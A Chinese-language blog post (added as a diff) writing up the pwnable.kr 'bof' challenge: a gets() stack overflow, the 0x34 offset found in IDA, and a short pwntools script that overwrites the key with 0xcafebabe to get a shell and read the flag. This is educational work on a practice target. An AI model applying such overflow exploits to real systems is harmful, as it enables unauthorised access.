@@ -1,0 +1,50 @@
+---
+layout:   post
+title:    pwmable.kr-bof
+subtitle:   Hello world,hello blog!
+date:     2019-07-30
+author:   吴柚
+header-img: post-bg-desk.jpg
+catalog:    true
+tags:
+    - 二进制
+---
+
+## 审题
+
+![](http://ww1.sinaimg.cn/large/006bbSI6ly1g5hzvaixq8j30kj0djq3h.jpg)
+
+从题目描述中可以得到，此题是缓冲区溢出的题目。题目所给文件需在Linux系统中下载。
+
+## 分析
+
+![](http://ww1.sinaimg.cn/large/006bbSI6ly1g5i07pm3c8j30m70fk779.jpg)
+
+从程序中我们可以得到以下几点
+
+> overflowme是一个局部数组变量，尺寸为32字节，且通过gets获取.
+> main中调用func时参数key指定为0xdeadbeef，在进入func后会落入else分支。
+> 想要进入func后落入if分支，需要通过某种方式修改key。
+
+然后把bof可执行文件放入IDA中查看。
+
+![](http://ww1.sinaimg.cn/large/006bbSI6ly1g5i378t2cjj30er06nt99.jpg)
+
+这是一个32位程序，参数key（对应ida中a1）通过栈传递。根据IDA的反汇编，可以看到key的位置在`ebp+8h`处,而局部变量overflowme（对应s）首地址在`ebp-2ch`处。因此，二者的距离为0x34。
+
+因为`gets(overflowme)`并没有对输入的长度进行限制，因此我们可以溢出overflowme数组来改写参数key，改写的值就是`0xCAFEBABE`。
+
+分析完之后，就是构造shellcode了。
+
+```
+from pwn import *
+
+p = remote('pwnable.kr',9000)
+sh = 'A'*52 + p32(0xcafebabe)
+p.sendline(sh)
+p.interactive()
+```
+
+运行脚本后，使用`ls`和`cat flag`指令即可得到flag.
+
+![](http://ww1.sinaimg.cn/large/006bbSI6ly1g5i3md4g09j30kd06u3z1.jpg)
